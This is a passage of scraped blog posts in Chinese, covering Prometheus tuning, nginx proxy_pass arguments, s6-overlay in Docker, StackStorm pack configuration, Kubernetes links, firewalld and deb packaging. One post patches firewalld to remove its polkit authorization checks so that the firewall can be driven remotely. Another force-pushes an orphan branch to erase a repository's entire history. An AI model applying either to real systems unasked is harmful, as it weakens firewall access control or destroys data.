regex: \u0026quot;apiserver_request_duration_seconds_bucket\u0026quot; action: drop recording rules 是允许预先将经常计算的表达式的结果保存为一组新的时间序列的，这种情况下查询的成本会比每次直接查询原始的表达式要快许多，并且在聚合后，可以将原来的指标删掉\n优化后每个块的大小\n优化后的每个块的大小\nReference [1] What are cardinality spikes and why do they matter?\n[2] How to manage high cardinality metrics in Prometheus and Kubernetes\n[3] 精简Prometheus指标减少资源占用\n[4] What are cardinality spikes and why do they matter?\n[5] Containing your Cardinality\n","permalink":"https://www.oomkill.com/2023/06/impove-prometheus-performance/","summary":"","title":"我在Prometheus监控中高基数问题中的优化之路"},{"content":"场景 在配置代理后，GET 请求的变量全部失效，配置如下\nlocation /fw { proxy_pass http://127.0.0.1:2952; } 我的需求是，/fw/ 的都发往 2952端口，但实际情况是404，原因为“在没有指定 URI 的情况下，在1.12版本后会传递原有的URI” 这时会导致一个404错误，因为我的后端接口本身就是 /fw/xxx/ 会出现重复\n接下来做了一个变量传递\nlocation ~* /fw/(?\u0026lt;section\u0026gt;.*) { proxy_pass http://127.0.0.1:2952/fw/$section; } 这时存在一个问题，就是 GET 请求的变量无法传递过去\n解决 nginx 官方给出一个样例，说明了，存在某种情况下，nginx 不会确定请求 URI 中的部分参数\n使用正则表达式时 在 localtion 名称内 例如，在这个场景下，proxy_pass 就会忽略原有的请求的URI，而将拼接后的请求转发\nlocation /name/ { rewrite /name/([^/]+) /users?name=$1 break; proxy_pass http://127.0.0.1; } 那么这服务我遇到的问题，nginx官方给出了使用方式\n当在 proxy_pass 中需要变量，可以使用 $request_uri;\n另外也可以使用 $is_args$args 参数 来保证原有的请求参数被传递\nlocation ~* /fw/(?\u0026lt;section\u0026gt;.*) { proxy_pass http://127.0.0.1:2952/fw/$section$is_args$args; } $is_args\n“?” if a request line has arguments, or an empty string otherwise\n$args\narguments in the request line\nReference\nAlphabetical index of variables\n","permalink":"https://www.oomkill.com/2023/05/nginx-proxy_pass/","summary":"","title":"踩坑nginx proxy_pass GET 参数传递"},{"content":"什么是容器中的多进程管理 在容器中的主进程 (main running process) 是指 Dockerfile中 ENTRYPOINT 或 CMD 指定运行的命令，通常情况下一个进程（服务）为一个容器；也存在一种场景，就是主进程会fork多个子进程，例如nginx，不过这种多进程通常为nginx主进程进行管理。而一些场景下，我们的业务本身就需要多个启用独立的多个进程。\n在Docker官方提到了在容器中运行多个服务的方式，官方提出，应该避免这种情况\nbut to get the most benefit out of Docker, avoid one container being responsible for multiple aspects of your overall application.\n但也给出了如何管理多进程的一种思路，\nUse a wrapper script Use Bash job controls Use a process manager 下面就通过官方给出的这三种方式阐述容器中的多进程管理\nUse a wrapper script 对于使用脚本来管理多进程来说，本质上是可以实现多进程的启动，但是你没法去监控(管理)多个进程的运行时，例如 Nginx + PHP 模式， PHP或nginx全部挂掉，只要脚本还在运行，那么这个容器的生命周期还是处于Running\nUse Bash job controls 这种模式是利用了Bash的后台模式进行短暂的切换进程，但有些镜像不提供Bash这时应该怎么办\nUse a process manager 进程管理器，通常情况下大家想到的就是顶顶大名的 supervisor 和 systemd，但这两个程序运行的环境十分苛刻，例如 supervisor 是Python开发的程序，运行需要依赖 Python；而 systemd 的运行条件更为苛刻，例如需要额外运行dbus-damon进行注册到dbus总线之上，这种进程管理器可能运行的进程比我们要管理的进程都要多。在这种场景下，有一个部署简单，配置简单，无依赖的轻量级容器多进程管理器 s6-overlay\ns6-overlay s6-overlay 一组脚本，只需要简单解压就可以使现有的 Docker 镜像通过将 s6 用作容器的 pid 1 和服务的来管理多个进程。\ns6-overlay 包含两个组件，s6-overlay-noarch.tar.xz 与 s6-overlay-x86_64.tar.xz\nnoarch 包含了一些脚本，是s6运行的所必须有的一个组件，他包含了 /init 作为 pid 为1 的进程 x86 是作为 x86系统下运行 s6 所需要的 所有二进制文件 编写服务启动脚本 需要在 /etc/s6-overlay/s6-rc.d/ 与 /etc/services.d/ 中配置你要启动的app，例如\n/etc/services.d/nginx/run run则代表启动的命令\n#!/command/execlineb -P nginx -g \u0026quot;daemon off;\u0026quot; 除上述提到的内容外，还需一个 type 来指明 启动的模式\nlongrun 运行为daemon模式被s6进行管理 oneshot 类似一个脚本，但通过s6-rc进行管理，类似于初始化任务 所以你需要在 /etc/s6-overlay/s6-rc.d/myapp/type 中定义其 type 文件，这个文件内填写这两种类型的文字即可\n到这里完成了一个基本的进程的配置，例如还有 finish 脚本，当在失败时执行的\nS6 init 的阶段 s6官方对init阶段省略了用户不需要关心的一个阶段后，为 3 个阶段\n初始化阶段 (initialization)，这里是内核启动的第一个用户态进程，该阶段作为init唯一的持久进程 巡航阶段 (cruising)，这个阶段init负责启动与维护其他进程，比如运行s6系列，init 的职责是清除孤儿进程并监督进程，同时允许管理员添加或删除服务，例如上面的 longrun 与 oneshot 类的服务，都是在这个阶段被启动 关闭阶段 (shutdown)，在此阶段结束时，所有进程都将被终止 发送 TERM 信号 到遗留的 longrun 服务，如果需要将等待结束后退出 有序的关闭用户 s6-rc 运行 finalization 脚本 向进程发送 TERM signal，最终不会留下任何的进程 sleep一阵，允许驻留的进程退出完 发送 KILL 信号，退出所有进程，这时容器退出 S6的安装 S6的安装很简单，步骤只需要如下几步：\n只需要下载对应的两个tar包 将 init 作为pid为1的进程 准备 installiation阶段 和 finalization 阶段的脚本 复制到对应路径内就可以正常启动了 finalization 通常使用场景为：当你的程序在退出时存在一些特定的结束命令的场景，官方给出的通常是用于进程结束后的清理动作\nNote that in general, finish scripts should only be used for local cleanups after a daemon dies. If a service is so important that the container needs to stop when it dies, we really recommend running it as the CMD.\n下面是一个完整的使用了 s6 的多进程容器的 Dockerfile\nFROM nginx:1.20 AS runner WORKDIR /uranus ARG S6_OVERLAY_VERSION=3.1.5.0 ADD https://github.com/just-containers/s6-overlay/releases/download/v${S6_OVERLAY_VERSION}/s6-overlay-noarch.tar.xz /tmp ADD https://github.com/just-containers/s6-overlay/releases/download/v${S6_OVERLAY_VERSION}/s6-overlay-x86_64.tar.xz /tmp RUN apt update \u0026amp;\u0026amp; apt install xz-utils procps iproute2 -y \u0026amp;\u0026amp; \\ tar -Jxpf /tmp/s6-overlay-x86_64.tar.xz -C / \u0026amp;\u0026amp; \\ tar -Jxpf /tmp/s6-overlay-noarch.tar.xz -C / \u0026amp;\u0026amp; \\ rm -f /tmp/s6-overlay-x86_64.tar.xz \u0026amp;\u0026amp; \\ rm -f /tmp/s6-overlay-noarch.tar.xz ENTRYPOINT [\u0026quot;/init\u0026quot;] RUN mkdir /etc/services.d/ COPY --from=builder /uranus/_output/firewalld-gateway ./bin/ COPY --from=builder /uranus/firewalld-gateway.toml . COPY --from=builder /uranus/dist /var/run/nginx/ COPY --from=builder /uranus/uranus.nginx.conf /etc/nginx/conf.d/ COPY --from=builder /uranus/s6/ /etc/s6-overlay/s6-rc.d/ COPY --from=builder /uranus/s6/ /etc/services.d/ ENV PATH \u0026quot;$PATH:/uranus/bin\u0026quot; RUN firewalld-gateway --sql-driver=sqlite --migration \u0026amp;\u0026amp; \\ rm -f /etc/nginx/conf.d/default.conf \u0026amp;\u0026amp; \\ echo \u0026quot;longrun\u0026quot; \u0026gt; /etc/s6-overlay/s6-rc.d/nginx/type \u0026amp;\u0026amp; \\ echo \u0026quot;longrun\u0026quot; \u0026gt; /etc/s6-overlay/s6-rc.d/uranus/type \u0026amp;\u0026amp; \\ mkdir -pv /etc/s6-overlay/s6-rc.d/uranus/contents.d \u0026amp;\u0026amp; \\ mkdir -pv /etc/s6-overlay/s6-rc.d/nginx/contents.d #CMD [ \u0026quot; /command/s6-svscan\u0026quot;, \u0026quot;/etc/services.d\u0026quot; ] VOLUME [\u0026quot;/uranus\u0026quot; ] EXPOSE 2953/tcp 在容器中进程内可以看出对应进程图 s6init 作为所有进程的父进程管理着supervise，之后管理者你需要管理的进程；如果进程异常，他会不断地拉起对应的进程，当然，如果是启动参数错误问题，那么永远不会被拉起，当然容器是出于 Running，这时就需要自行做服务检测\n$ pstree s6-svscan-+-s6-supervise---s6-linux-init-s |-s6-supervise---s6-ipcserverd |-3*[s6-supervise] |-s6-supervise---firewalld-gatew---5*[{firewalld-gatew}] `-s6-supervise---nginx---4*[nginx] $ ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 May18 ? 00:00:00 /package/admin/s6/command/s6-svscan -d4 -- /run/service root 16 1 0 May18 ? 00:00:00 s6-supervise s6-linux-init-shutdownd root 18 16 0 May18 ? 00:00:00 /package/admin/s6-linux-init/command/s6-linux-init-shutdownd -c /run/s6/basedir -g 3000 -C -B root 25 1 0 May18 ? 00:00:00 s6-supervise s6rc-oneshot-runner root 26 1 0 May18 ? 00:00:00 s6-supervise s6rc-fdholder root 27 1 0 May18 ? 00:00:00 s6-supervise uranus root 28 1 0 May18 ? 00:00:00 s6-supervise nginx root 34 25 0 May18 ? 00:00:00 /package/admin/s6/command/s6-ipcserverd -1 -- /package/admin/s6/command/s6-ipcserver-access -v0 -E -l0 -i data/rules -- /package/admin/s6/command/s6-sudod -t 30000 -- /package/admin/s6-rc/command/s6-rc-oneshot-run -l . root 69 1 0 May18 ? 00:00:00 s6-supervise uranus root 70 1 0 May18 ? 00:00:00 s6-supervise nginx root 71 69 1 May18 ? 00:36:40 /uranus/bin/firewalld-gateway -v 5 --sql-driver=sqlite --config=/uranus/firewalld-gateway.toml root 72 70 0 May18 ? 00:00:00 nginx: master process nginx -g daemon off; nginx 74 72 0 May18 ? 00:00:00 nginx: worker process nginx 75 72 0 May18 ? 00:00:00 nginx: worker process nginx 76 72 0 May18 ? 00:00:00 nginx: worker process nginx 77 72 0 May18 ? 00:00:00 nginx: worker process root 83 0 1 04:17 pts/0 00:00:00 bash root 90 83 0 04:18 pts/0 00:00:00 ps -ef Reference How to run s6-svscan as process 1\nUsage\n","permalink":"https://www.oomkill.com/2023/05/multi-process-management/","summary":"","title":"Docker中的多进程管理 s6-overlay"},{"content":"基本概念 从版本 2.4 开始，如果包包含.config.yaml ，可以使用包配置，包配置可以使用配置文件来设置包中资源通用的值，例如 API 凭证、连接详细信息、限制和阈值。这些值在运行时可供操作和传感器使用。\n包配置和 Action 参数之间的区别在于，配置通常包含包中所有资源通用的值，并且很少更改。动作参数是随每个动作调用动态提供的，并且可能会发生变化 - 例如，它们可能来自映射某些输入事件的规则。\n包配置遵循基础架构即代码方法，并存储在特殊目录中的 YAML 格式文件中（默认情况下 /opt/stackstorm/configs）。每个包都为此配置文件定义自己的架构。\n配置 Schema 配置文件的结构是一个 YAML 格式的文件，它定义了该包的配置文件。该配置由包作者自行编写，包含有关每个可用配置项的信息，例如名称, Secret等）。该文件已命名 config.schema.yaml 并位于包目录 /opt/stackstorm/packs/\u0026lt;mypack\u0026gt; 的根目录中。\n这是一个示例包配置文件：\n--- api_key: description: \u0026quot;API key\u0026quot; type: \u0026quot;string\u0026quot; required: true api_secret: description: \u0026quot;API secret\u0026quot; type: \u0026quot;string\u0026quot; secret: true required: true region: description: \u0026quot;API region to use\u0026quot; type: \u0026quot;string\u0026quot; required: true default: \u0026quot;us-east-1\u0026quot; private_key_path: description: \u0026quot;Path to the private key file to use\u0026quot; type: \u0026quot;string\u0026quot; required: false 在该示例中，配置文件由 4 项 配置组成 (api_key, api_secret, region, private_key_path)\n注，api_secret 被标注为 secret，这意味着如果使用动态值，则该值将加密存储在数据存储中。\n除了上面所示的“平面”配置之外，模式还支持嵌套对象。例如：\n--- consumer_key: description: \u0026quot;Your consumer key.\u0026quot; type: \u0026quot;string\u0026quot; required: true secret: true consumer_secret: description: \u0026quot;Your consumer secret.\u0026quot; type: \u0026quot;string\u0026quot; required: true secret: true access_token: description: \u0026quot;Your access token.\u0026quot; type: \u0026quot;string\u0026quot; required: true secret: true access_token_secret: description: \u0026quot;Your access token secret.\u0026quot; type: \u0026quot;string\u0026quot; required: true secret: true sensor: description: \u0026quot;Sensor specific settings.\u0026quot; type: \u0026quot;object\u0026quot; required: false additionalProperties: false properties: device_uuids: type: \u0026quot;array\u0026quot; description: \u0026quot;A list of device UIDs to poll metrics for.\u0026quot; items: type: \u0026quot;string\u0026quot; required: false 在该示例中，配置文件可以包含一个 sensor 项目，该项目是具有单个 device_uuids 属性的对象。\n配置文件 配置文件是 YAML 格式的文件，该文件可以包含 “静态” 或 “动态” 值。配置文件已命名并位于 /opt/stackstorm/configs/\u0026lt;pack name\u0026gt;.yaml 目录中。文件所有权应该是 st2:st2\n例如，对于名为 libcloud 的包 配置文件位于 /opt/stackstorm/configs/libcloud.yaml。\n--- api_key: \u0026quot;some_api_key\u0026quot; api_secret: \u0026quot;{{st2kv.user.api_secret}}\u0026quot; # user-scoped configuration value which is also a secret as declared in config schema region: \u0026quot;us-west-1\u0026quot; private_key_path: \u0026quot;{{st2kv.system.private_key_path}}\u0026quot; # global datastore value 配置文件不会在 run-time时动态读取，必须先进行注册，然后将值加载到 StackStorm DB 中。它们的注册方式与其他资源相同，通过运行 st2ctl reload / st2-register-content 脚本来注册。对于config，您需要使用 \u0026ndash;register-configs flag 运行此脚本：\nsudo st2ctl reload --register-configs # Or sudo st2-register-content --register-configs 在使用上述命令加载和注册 config 时，将根据 shema 验证配置文件中的静态值。如果 schema 不存在，则不执行验证。\n注：仅验证配置中的静态值。动态值（使用 Jinja 表示法引用数据存储中的值的值）在运行时解析，因此无法在 register/load 阶段验证它们。\n静态配置值 静态配置值是从配置文件加载并按原样使用的值。\n动态配置值 动态配置值提供了额外的灵活性，并包括对用户范围的数据存储值的支持。当您想要根据调用操作的用户使用不同的配置值时，这非常有用。\n动态配置值是包含 Jinja 模板表达式的值。该模板表达式在运行时进行计算，并解析为 数据存储区 值的名称（Keys）。然后，该数据存储值将用作配置值。\n注：目前只有字符串（字符串类型）支持动态配置值。\n在config中，动态配置值的引用如下：\n--- api_secret: \u0026quot;{{st2kv.user.api_secret}}\u0026quot; # user-scoped configuration value which is also a secret as declared in config schema private_key_path: \u0026quot;{{st2kv.system.private_key_path}}\u0026quot; # global datastore value api_secret 是一个用户范围的动态配置值，这意味着 user 部分将被触发操作执行的用户的用户名替换。\n动态配置值存储在“数据存储”中，并使用 CLI 或 API 进行配置。\n如果某个值在配置 schema 中被标记为加密，则需要将其加密存储在数据存储中。设置该值时， 应使用 \u0026ndash;encrypt 标志，如下所示：\nst2 key set api_secret \u0026quot;my super secret api secret\u0026quot; --scope=user --encrypt 在上面的示例中，private_key_path 常规动态配置值，这意味着 private_key_path 将从数据存储中加载与此键对应的数据存储项。在这种情况下，使用命令行将该值设置如下：\nst2 key set private_key_path \u0026quot;/home/myuser/.ssh/my_private_rsa_key\u0026quot; 配置的加载和配置动态值解析 配置文件在注册时加载。动态值在运行时解析。对于传感器，这是传感器容器为传感器实例生成子进程的时间，对于 Action，这是执行 Action 的时间。\n解析和加载用户范围的配置值时，触发操作 Action 的经过身份验证的用户将用作解析值时的上下文。\n在解析和加载用户范围配置值时，使用认证后的用户触发操作 Action 的来作为上下文来解析该值。\n命令行配置动态值 可以使用 st2 key 命令集与其他数据存储项相同的方式操作动态配置值，动态配置值包含“用户范围的动态配置值” 与 “常规动态配置值”\n配置常规动态配置值 常规动态配置值可以由管理员或任何用户配置：\nst2 key set \u0026lt;key name\u0026gt; \u0026lt;key value\u0026gt; # For example st2 key set private_key_path \u0026quot;/home/myuser/.ssh/my_private_rsa_key\u0026quot; 要查看配置值可以使用命令 st2 key get\nst2 key get \u0026lt;key name\u0026gt; # For example st2 key get private_key_path 注意：默认情况下 Secret 类型的值将被屏蔽。\n配置用户范围的动态配置值 动态配置值可以由每个用户自己配置，也可以由管理员为任何可用的系统用户配置：\nst2 key set --scope=user [--encrypt] \u0026lt;key name\u0026gt; \u0026lt;key value\u0026gt; # For example (authenticated as \u0026quot;user1\u0026quot;) st2 key set --scope=user default_region \u0026quot;us-west-1\u0026quot; st2 key set --scope=user --encrypt api_secret user1_api_secret # For example (authenticated as \u0026quot;user2\u0026quot;) st2 key set --scope=user default_region \u0026quot;us-east-1\u0026quot; st2 key set --scope=user --encrypt api_secret user2_api_secret # For example (authenticated as administrator, setting a value for \u0026quot;user1\u0026quot; and \u0026quot;user2\u0026quot;) st2 key set --scope=user --user=user1 default_region \u0026quot;us-west-1\u0026quot; st2 key set --scope=user --user=user2 default_region \u0026quot;us-east-1\u0026quot; 查看值命令时用户只能看到他们自己的值，管理员可以看到所有值，默认情况下秘密被屏蔽\n配置的使用 配置可以在 Packs 中的 Python 脚本中全局调用，但需要注意的是，Action 与 Sensor 的 Python 脚本调用有些微差异。\n例如我们有一个 pack，名为 config_example，那么配置文件应定义为 config_example.yaml\n--- if_host: '10.0.0.26' if_port: 8086 if_username: 'ifadm' if_password: 'xxxxxxx' 在 /opt/stackstorm/pack/{packs_name}/actions/ 目录下的 Python 脚本可使用如下方法调用。\nhost=self.config['if_host'] port=self.config['if_port'] username=self.config['if_username'] password=self.config['if_password'] 在 /opt/stackstorm/pack/crontab/sensor/ 中的 Python 脚本，则必需使用下列方法调用。\nhost=self._config['if_host'] port=self._config['if_port'] username=self._config['if_username'] password=self._config['if_password'] Reference [1] Pack Configuration\n","permalink":"https://www.oomkill.com/2023/05/stackstorm-pack-configuaration/","summary":"","title":"StackStorm自动化 - 包配置"},{"content":"vue项目部署在裸机Linux上运行正常，部署在docker中nginx出现下列错误\nNginx \u0026quot;rewrite or internal redirection cycle while internally redirecting to \u0026quot;/index.html\u0026quot; 表现在用户界面 500 Internal Server Error\n原因：nginx配置路径不对，改成正确的后恢复\n","permalink":"https://www.oomkill.com/2023/05/ngx-in-docker-500/","summary":"","title":"解决nginx在docker中报错 [rewrite or internal redirection cycle while internally redirecting to \"/index.html]"},{"content":"Deployment Recommended Cluster Architecture - rancher Hardware recommendations - etcd Considerations for large clusters - kubernetes cluster Operating etcd clusters for Kubernetes Recommended performance and scalability practices Binary deploy script pure shell Managing Kubernetes Traffic with F5 NGINX Eraser - Cleaning up Images from Kubernetes Nodes 对于不同规模的 Kubernetes 集群所需要的 etcd 规模推荐 datree: allowing you to scan your k8s configs during development Performance etcd: getting 30% more write/s 蚂蚁集团万级规模 K8s 集群 etcd 高可用建设之路 各组件参数配置调优 万级K8s集群背后etcd稳定性及性能优化实践 K8s 集群稳定性：LIST 请求源码分析、性能评估与大规模基础服务部署调优 Comparing comparing Kubernetes ingress controller Troubleshooting 一次Etcd集群宕机引发的思考 Stern: allows you to tail multiple pods on Kubernetes Diagnosis Kubernetes 自动化诊断工具：k8sgpt-operator ktop: displays useful metrics information about kubernetes cluster Dashboard KDash - A fast and simple dashboard for Kubernetes Security Kubernetes 加固指南 Popeye 扫描实时 Kubernetes 集群并报告已部署资源和配置的潜在问题 Test kube-monkey It randomly deletes Kubernetes (k8s) pods in the cluster encouraging and validating the development of failure-resilient services. Study KWOK (Kubernetes With Out Kubelet) Backup etcd 备份与恢复工具 ","permalink":"https://www.oomkill.com/2023/05/awesome-kubernetes/","summary":"","title":"Awesome kubernetes"},{"content":"cloud-controller-manage controller相关 cloud-controller-manage 没有听清楚名称\n云平台LB 答的方向是metalLB设计，而interviewer想听的是云平台方向\n容器底座实现技术方向 contrainerd方向问题\nLinux内存和cpu的调度问题 没有答上\nkubernetes集群在扩容需要考虑到的问题 APIServer方向：kubernetes官方提供了集群规模的配置 控制平面方向： contorller, sheduler 日志的输出（可以不需要管理） worker节点： 镜像仓库的压力（P2P仓库） ","permalink":"https://www.oomkill.com/2023/05/interview-retrospective-2304/","summary":"","title":"interview retrospective 2304"},{"content":"为什么去除polkit验证 在2021年询问过firewalld项目组，firewalld在dbus通讯时，会进行两部认证 policy kit 和 UID checking，正是因为这种情况，使得firewalld不能够通过TCP/IP连接，如果你需要连接，因为存在 UID checking ，这时会因为没有UID会报错。\nfirewalld needs to do some authorization on the dbus request. It currently tries two ways, in order of preference:\npolicy kit UID checking Neither of these are available over a TCP/IP dbus connection. [1]\n如何去除polkit 首选需要确定你的firewalld版本，例如Centos7系列，那么你的 firewalld 版本为 0.6.3，那么你需要修改的包为 python-firewall-0.6.3, 在 debian11 上 firewalld版本默认为 0.9.3，那么需要关注的版本为：python3-firewall_0.9.3\n在确定版本后直接从github仓库进行拉去修改就可以\ngit fetch v0.9.3 git checkout v0.9.3 对于 python-firewall-0.6.3 来说。直接注释掉 slip.dbus.polkit.require_auth 就可以了\n@slip.dbus.polkit.require_auth(config.dbus.PK_ACTION_POLICIES_INFO) @dbus_service_method(config.dbus.DBUS_INTERFACE_POLICIES, in_signature='', out_signature='as') 而对于新一些版本的场景下，可以在github上看到，他们移除了对 python-slip 的依赖，这将对去除polkit认证的步骤则有些许调整 [2]:\n首先需要完全移除修饰器 polkit.require_auth\n完全移除修饰器 @slip.dbus.polkit.enable_proxy\n由于对 slip.dbus 去除，那么需要注释掉 import slip.dbus*\n此时修改firewall server，去除基于slip的mainloop，改为旧版本形式\nmainloop = GLib.MainLoop() slip.dbus.service.set_mainloop(mainloop) mainloop.run() # 修改为 mainloop = GLib.MainLoop() mainloop.run() 为了兼容命令 firewall-cmd ，还需要将 FirewallClient 中使用 slip.dbus.xxx 的内容修改为 dbus.xxx\ntry: self.bus = slip.dbus.SystemBus() # 修改为 self.bus = dbus.SystemBus() except dbus.exceptions.DBusException as e: raise FirewallError(errors.DBUS_ERROR, e.get_dbus_message()) else: print(\u0026quot;Not using slip.dbus\u0026quot;) 最后一步，根据你的发行版本进行打包安装即可\nTips：Redhat系列官方提供了rpm打包文件直接用就可以\ndebian control文件为：\nPackage: python3-firewall Version: 0.9.3 Architecture: amd64 Description: python3-firewall Maintainer: Cylon Chau \u0026lt;cylonchau@outlook.com\u0026gt; Section: comm Homepage: https://github.com/cylonchau/firewalld debian构建目录为根据原生包目录格式进行后见即可\ndbus配置 debian 系列 dbus 配置与 redhat 系列有略微差别，配置文件目录为\n主配置文件需要自行控制权限，必须为：/etc/dbus-1/system.d/org.freedesktop.PackageKit.conf 其他配置可以根据redhat 系列进行调整即可 最后感谢firewalld团队，issue回复超级快，如果你需要像使用阿里云安全组使用firewalld管理你公司的大量linux 防火墙，可以试试我的项目 github.com/cylonchau/firewalld-gateway，这是一个firewlld控制器，可以管理大量的firewalld主机\nReference [1] firewalld issue 851\n[2] firewalld issue 793 drop dependency python-slip\n","permalink":"https://www.oomkill.com/2023/04/firewalld-without-polkit/","summary":"","title":"firewalld去除polkit验证"},{"content":"如果不小心提交github提交错了，而 --amend 也不能修改提交者的信息，可以通过尝试下面的方式\nCheckout\ngit checkout --orphan \u0026lt;latest_branch\u0026gt; Add all the files\ngit add -A Commit the changes\ngit commit -am \u0026quot;commit message\u0026quot; Delete the branch\ngit branch -D main Rename the current branch to main\ngit branch -m main Finally, force update your repository\ngit push -f origin main 缺点是：所有该分支的提交记录都将被删除\nReference\nhow to delete all commit history in github? ","permalink":"https://www.oomkill.com/2023/04/delete-github-commit/","summary":"","title":"删除github上面的历史提交记录"},{"content":"deb 概述 deb包（.deb）是 Debian 和基于 Debian衍生操作系统（如Ubuntu）中使用的一种软件包的格式。deb是一种基于 Unix ar [3] (Unix archiver) 的归档文件。其中包含二进制文件、配置文件和其他软件所需的资源。deb包可用于安装、升级和卸载软件包。通常，Debian操作系统的用户使用apt（Advanced Package Tool）等软件包管理器工具来管理deb包。通过这些工具，用户可以轻松下载、安装和管理软件包，而无需手动编译、安装和解决软件包之间的依赖关系。\ndeb VS rpm 包的归档格式不同：deb是基于 ar 的归档模式，而RPM是基于 cpio 的归档模式 包的结构不同：deb包要求必须包含一个 DEBIAN 目录；而RPM不需要以来额外的目录结构 包的依赖机制不同： Deb使用epoch，而RPM使用build number：在Deb中，epoch是一个可选的字段，它允许呈现基准日期之前的先前版本。而在RPM中，build number表示软件包编译的次数。因此，在Deb中，为了解决版本控制问题，epoch是非常重要的，而在RPM中，则更关注build number。 Deb使用逆向依赖关系，而RPM使用依赖关系：在Deb中，依赖项是从包本身向外扩展，在解决依赖问题时可以通过逆向依赖关系进行。而在RPM中，则更喜欢使用依赖关系直接指向其他包。 Deb允许代理软件包，而RPM则不允许代理软件包：Deb中，软件包可以使用另一种软件包的代理来提供功能。在RPM中，软件包需要直接引用相关的软件包。这意味着在Deb中，对于版本控制，可以用另一种代理软件包来解决问题，而在RPM中必须直接引用包。 Deb允许多重依赖关系，RPM则不允许：Deb允许使用多个依赖项列表，以便包与不同版本的库兼容。在RPM中，需要在每个包中定义依赖项和其版本，不能使用多重依赖。 deb包的分析 deb包的结构 deb 最重要的是 控制文件 Control ，该文件记录了deb包与其安装的程序的信息。\n在deb包内部包含一组模拟 Linux 文件系统的文件夹，例如 /usr, /usr/bin, /opt等等。 放置在其中一个目录中的文件将在安装期间复制到实际文件系统中的相同位置。 因此，例如将二进制文件放入 \u0026lt;.deb\u0026gt;/usr/local/bin/binaryfile 将被安装到 /usr/local/bin/binaryfile.\n对于deb 包的命名是遵循着一个特定的格式：\n\u0026lt;name\u0026gt;_\u0026lt;version\u0026gt;-\u0026lt;revision\u0026gt;_\u0026lt;architecture\u0026gt;.deb \u0026lt;name\u0026gt; 构建的deb包名称，如nginx \u0026lt;version\u0026gt; 程序的版本号 ，如1.20 \u0026lt;revision\u0026gt; 当前 deb 包的版本号 \u0026lt;architecture\u0026gt; 表示构建出的包的操作系统架构，如，amd64、i386 如果你构建一个nginx-1.20的arm操作系统下的，那么deb包名格式则为 nginx_1.20-1_arm64.deb\ncontrol文件 [2] Deb软件包（.deb文件）中的 控制文件 (control) 包含有关软件包的 源码元数据 和 二进制元数据 ，用于描述例如软件包的名称、版本、描述、作者、许可证和依赖关系等信息。在创建和打包Deb软件包时，必须创建和编辑control文件以包含关于软件包的所有必要信息。\n控制文件 (control) 由一个或多节组成，各节之间用空行分隔。解析器可以接受仅由空格和制表符组成的行作为节分隔符，但控制文件应该使用空行。一些控制文件只允许一个节；其他人允许多个，在这种情况下，每个节通常指的是不同的包，控制文件中节的顺序很重要。\n而 Control 文件存在两种，一种为 源代码包控制文件 (Source package control files)，这种类型的控制文件主要用于定义源代码在构建时的一些元数据信息，例如需要构建一个nginx.deb，那么源代码控制文件就是用于描述下载下来的源代码相关的数据，这种文件被放置在目录 debian/control；\n另一种为二进制包控制文件 (Binary package control files)，这部分是控制在nginx编译后制作成deb包的控制文件，这种控制文件被放置在 DEBIAN/control。\n另外还存在一种 源代码控制文件 ( Debian source control files ) ，包含完整的源代码和软件包元数据信息。它们通常存储在软件包的源代码存储库中，供开发人员和维护人员使用。包含在源代码控制文件中的信息包括软件包名称、版本、维护人员、许可证、依赖关系、构建和安装指令集等。\n例如下面为 control 文件常见的字段类型：\n字段 说明 Package \u0026lt;软件包的名称\u0026gt; Priority \u0026lt;软件包的优先级\u0026gt; Section \u0026lt;软件包的分类\u0026gt; Version \u0026lt;软件包的版本\u0026gt; Depends \u0026lt;软件包的依赖关系\u0026gt; Architecture \u0026lt;软件包的体系结构\u0026gt; Maintainer \u0026lt;软件包的维护者\u0026gt; Description \u0026lt;软件包的描述\u0026gt; Rules-Requires-Root [1] Rules-Requires-Root是Debian软件包中一个可选的控制文件，定义了软件包在安装和运行时是否需要超级用户权限；No/Yes Standards-Version: deb包 控制文件 中的一个元素，用于指定软件包所遵循的标准和规范的版本号。该字段的值应该是一个数字，例如：“3.9.8”, “2.3.0.0” 其中，上面给出的通常是必须指定的字段，如一个control 文件必须包含 Package 、Priority、Section、Version、Architecture、Maintainer 和Description 。由于等 deb软件包通常都安装在系统上，在 control 文件中指定软件包的依赖关系非常重要。这可通过Depends字段完成。\n例如下面是一个 control 文件的示例\n# 源代码控制文件 Source: nginx Maintainer: root \u0026lt;root@debian-template\u0026gt; Section: comm Priority: optional Homepage: https://nginx.org # 二进制控制文件 Package: nginx Version: 1.22.1 Architecture: amd64 Standards-Version: 1.0.0 Build-Depends: debhelper-compat (= 13) Description: Nginx HTTP server Nginx (\u0026quot;engine x\u0026quot;) is a web server created by Igor Sysoev. It is known for its high performance, stability, and low resource consumption. rules文件 [5] rules文件的规范 rules文件在deb中被成为 主要构建脚本 (Main building script)，这个文件必须是一个可执行的Makefile。它包含了特定于包的源代码（如果需要）和构建一个或多个二进制包的指令。\ndebian/rules文件 必须以 #!/usr/bin/make -f 开头，这个声明是为了通过调用其名称而不是显式调用make来调用它。也就是说，调用 make -f debian/rules args... 或 ./debian/rules args... 必须产生相同的行为。\n在没有使用其他方法的充分理由的情况下，实现Debian软件包构建过程的推荐方式是使用dh工具。这包括debian/rules构建脚本的内容。dh是Debian中最常见的封装辅助工具。使用它通常可以节省遵守本文档中规则的工作，因为dh将自动实现许多规则而无需明确的指示。\nrules 文件内置了一些阶段，这标志着整个源码包构建的过程；如 debian/rules 必须由：clean、binary、binary-arch、binary-indep、build、build-arch 和 build-indep，如果通过 dpkg-buildpackage 构建时，这些阶段则是调用的阶段。\n需要注意的一点是，由于交互式 debian/rules 脚本无法自动编译该软件包，也使其他人难以复制相同的二进制软件包，因此所有必需的阶段都必须是非交互式的。它还遵循这些阶段所依赖的任何阶段也必须是非交互式的。\nrules文件的构建过程 通俗来说，rules文件是一个将源码包转换为二进制包的一个构建模式，首先，binarey二进制包写入解压后的源码包的父目录。其次，所需的目标可以写入 /tmp、/var/tmp 和 TMPDIR 环境变量指定的目录，但不得依赖于其中任何一个的内容。\n这个限制旨在防止源代码包构建创建和依赖于其外部状态，从而影响多个独立的重建过程。特别地，所需的目标不能尝试写入 HOME 目录。\nrules文件的过程，也是阶段：\nbuild (required)：该阶段应该执行软件包的所有配置和编译操作，例如 make，这个阶段执行前，会先运行 clean 阶段 build-indep 和 build-arch (required) build-arch (required)：该阶段必须执行生成所有与架构（architecture）有关的二进制包，例如 make intall 好的 x86 的二进制文件 build-indep (required)： 该阶段执行生成所有与 